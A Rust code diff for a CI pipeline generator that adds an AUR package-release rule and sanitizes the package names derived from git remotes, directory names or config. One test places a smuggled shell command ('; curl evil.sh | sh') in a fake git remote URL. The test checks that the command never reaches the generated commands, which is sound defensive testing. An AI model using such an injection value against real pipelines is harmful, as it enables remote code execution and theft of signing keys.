@@ -6,6 +6,7 @@
 //! default; `cibox.ron` overrides flip individual rules on or off and set the
 //! few knobs some rules have.
 
+pub mod aur;
 pub mod cmake;
 pub mod docker;
 pub mod gitleaks;
@@ -19,6 +20,7 @@ use crate::config::CiboxConfig;
 use crate::detection::ProjectFacts;
 use crate::ir::{Job, MatrixEntry};
 
+pub use aur::AurRelease;
 pub use cmake::{CmakeBuild, CmakeFmt, CmakeTest};
 pub use docker::{DockerBuild, DockerRelease};
 pub use gitleaks::Gitleaks;
@@ -128,6 +130,34 @@ pub fn docker_image(facts: &ProjectFacts, config: &CiboxConfig) -> String {
     crate::config::image::coerce_reference(raw)
 }
 
+/// The AUR package names the aur-release rule publishes, in effect for this
+/// project + config: the knob, else one package named after the git remote's
+/// repository, else the directory name.
+///
+/// Every result is a valid AUR package name. The names become literal shell
+/// words in the generated pipeline, and none of their sources are trustworthy
+/// — the slug comes from whatever `.git/config` says, the directory name from
+/// wherever the project happens to sit, and the knob from a file the editor
+/// may have been pointed at. `parse_config` rejects a malformed knob
+/// outright; anything that still gets this far is sanitized rather than
+/// pasted into a command.
+pub fn aur_packages(facts: &ProjectFacts, config: &CiboxConfig) -> Vec<String> {
+    let configured = clean_versions(config.aur_release.packages.as_ref());
+    if !configured.is_empty() {
+        return configured
+            .iter()
+            .map(|p| crate::config::aur::coerce_package_name(p))
+            .collect();
+    }
+    // The repository part of the slug only — AUR names have no namespace
+    let raw = facts
+        .repo_slug
+        .as_deref()
+        .and_then(|slug| slug.rsplit('/').next())
+        .unwrap_or(&facts.dir_name);
+    vec![crate::config::aur::coerce_package_name(raw)]
+}
+
 /// Build every rule with its knobs resolved (facts-derived defaults overlaid
 /// with config overrides) and compute its enabled state.
 pub fn resolve(facts: &ProjectFacts, config: &CiboxConfig) -> Vec<ResolvedRule> {
@@ -182,6 +212,9 @@ pub fn resolve(facts: &ProjectFacts, config: &CiboxConfig) -> Vec<ResolvedRule> 
             sync_readme: config.docker_release.sync_readme.unwrap_or(false),
         }),
         Box::new(Gitleaks),
+        Box::new(AurRelease {
+            packages: aur_packages(facts, config),
+        }),
     ];
 
     rules
@@ -307,6 +340,7 @@ mod tests {
             crate::config::DockerPlatform::LinuxAmd64,
             crate::config::DockerPlatform::WindowsAmd64,
         ]);
+        config.aur_release.packages = Some(vec!["a".to_string(), "b".to_string()]);
         let facts = rust_facts();
         for r in resolve(&facts, &config) {
             for job in r.rule.jobs(&facts) {
@@ -510,6 +544,87 @@ mod tests {
             s,
             crate::ir::Step::Run { command, .. } if command.contains("docker-pushrm")
         )));
+    }
+
+    #[test]
+    fn test_aur_packages_defaults_from_repo_slug() {
+        let dir = tempdir().unwrap();
+        fs::create_dir_all(dir.path().join(".git")).unwrap();
+        fs::write(
+            dir.path().join(".git/config"),
+            "[remote \"origin\"]\n\turl = https://github.com/fossable/cibox.git\n",
+        )
+        .unwrap();
+        let facts = crate::detection::gather_facts(dir.path());
+        assert_eq!(facts.repo_slug.as_deref(), Some("fossable/cibox"));
+        assert_eq!(
+            aur_packages(&facts, &CiboxConfig::default()),
+            vec!["cibox"]
+        );
+    }
+
+    #[test]
+    fn test_aur_packages_falls_back_to_the_directory_name() {
+        let dir = tempdir().unwrap();
+        let project = dir.path().join("My App");
+        fs::create_dir(&project).unwrap();
+        let facts = crate::detection::gather_facts(&project);
+        assert_eq!(
+            aur_packages(&facts, &CiboxConfig::default()),
+            vec!["my-app"]
+        );
+    }
+
+    #[test]
+    fn test_hostile_remote_cannot_reach_the_aur_commands() {
+        // The slug comes from whatever .git/config says, and lands in
+        // `git clone ssh://aur@.../<pkg>.git` in a job holding the AUR key
+        let dir = tempdir().unwrap();
+        fs::create_dir_all(dir.path().join(".git")).unwrap();
+        fs::write(
+            dir.path().join(".git/config"),
+            "[remote \"origin\"]\n\turl = https://host/owner/repo; curl evil.sh | sh\n",
+        )
+        .unwrap();
+        let facts = crate::detection::gather_facts(dir.path());
+        let raw = facts.repo_slug.clone().unwrap();
+        assert!(raw.contains("curl"));
+
+        let config = CiboxConfig::default();
+        assert_eq!(aur_packages(&facts, &config), vec!["repo-curl-evil.sh-sh"]);
+        let resolved = resolve(&facts, &config);
+        let aur = resolved
+            .iter()
+            .find(|r| r.rule.id() == "aur-release")
+            .unwrap();
+        for job in aur.rule.jobs(&facts) {
+            for step in &job.steps {
+                if let crate::ir::Step::Run { command, .. } = step {
+                    assert!(!command.contains(&raw), "{command:?}");
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn test_aur_packages_knob_flows_into_jobs() {
+        let mut config = CiboxConfig::default();
+        config.aur_release.enabled = Some(true);
+        // Trimmed, de-duped, empties dropped — same treatment as versions
+        config.aur_release.packages = Some(vec![
+            "goldboot".to_string(),
+            " goldboot ".to_string(),
+            String::new(),
+            "goldboot-registry".to_string(),
+        ]);
+        let resolved = resolve(&ProjectFacts::default(), &config);
+        let jobs = enabled_jobs(&ProjectFacts::default(), &resolved);
+        let ids: Vec<&str> = jobs
+            .iter()
+            .filter(|j| j.id.starts_with("aur-release"))
+            .map(|j| j.id.as_str())
+            .collect();
+        assert_eq!(ids, vec!["aur-release-goldboot", "aur-release-goldboot-registry"]);
     }
 
     #[test]
